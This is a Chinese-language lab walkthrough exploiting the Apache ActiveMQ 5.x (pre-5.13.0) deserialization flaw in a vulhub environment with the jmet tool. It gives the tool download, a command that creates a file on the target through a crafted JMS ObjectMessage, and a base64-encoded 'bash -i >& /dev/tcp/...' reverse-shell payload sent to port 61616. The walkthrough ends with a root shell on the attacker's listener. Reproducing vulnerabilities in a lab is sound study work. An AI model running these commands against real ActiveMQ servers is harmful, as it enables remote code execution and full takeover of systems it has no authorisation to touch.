## 前言

Apache ActiveMQ
5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。

## 利用

环境搭建：<https://vulhub.org/#/docs/>

工具下载：

    
    
    wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar

kali ：192.168.110.208

vulhub漏洞环境：192.168.110.213

首先进入jmet安装目录我这里安装在/opt下

远程创建文件：

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/wys" -Yp
ROME 192.168.110.213 61616

![](https://image.3001.net/images/20201111/1605080507_5fab95bbe3f19304b3976.png!small)

此时会给目标的ActiveMQ添加一个名为事件的队列，可以我们通过http://192.168.110.213:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：

![](https://image.3001.net/images/20201111/1605080542_5fab95dec1935e5c5c4a6.png!small)

点击查看相应的id号消息即可触发命令执行

![](https://image.3001.net/images/20201111/1605080575_5fab95ff42f0d852ff69c.png!small)

此时进入容器

docker-compose exec activemq bash

发现创建的文件

![](https://image.3001.net/images/20201111/1605080620_5fab962c125ba3eac2af4.png!small)

kali弹shell：

将bash -i >& /dev/tcp/192.168.110.208/8888 0>&1 base64编码得到

YmFzaCAtaSA+JiAvZGV2L3RjcC8xO.......yMDgvODg4OCAwPiYxCg==

![](https://image.3001.net/images/20201111/1605080652_5fab964c173f64384de25.png!small)

payload如下：

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8x.......MDgvODg4OCAwPiYxCg==}|{base64,-d}|{bash,-i}"
-Yp ROME 192.168.110.213 61616

![](https://image.3001.net/images/20201111/1605080692_5fab9674e5c6907d97268.png!small)

kali监听，成功，拿到root权限

![](https://image.3001.net/images/20201111/1605080714_5fab968a99ac2736725cd.png!small)

  

